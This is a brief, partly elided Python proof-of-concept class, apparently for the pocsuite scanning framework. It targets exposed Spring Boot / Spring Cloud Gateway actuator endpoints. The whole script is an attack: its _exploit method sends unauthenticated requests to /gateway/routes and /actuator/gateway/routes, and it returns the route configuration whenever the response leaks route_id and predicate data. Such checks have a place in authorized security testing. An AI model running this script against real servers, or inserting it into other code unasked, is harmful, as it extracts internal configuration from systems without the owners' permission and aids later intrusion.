...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth env Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/gateway/routes","/actuator/gateway/routes"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if "predicate" in res.text and "route_id" in res.text and "application/json" in res.text:
                return res.text
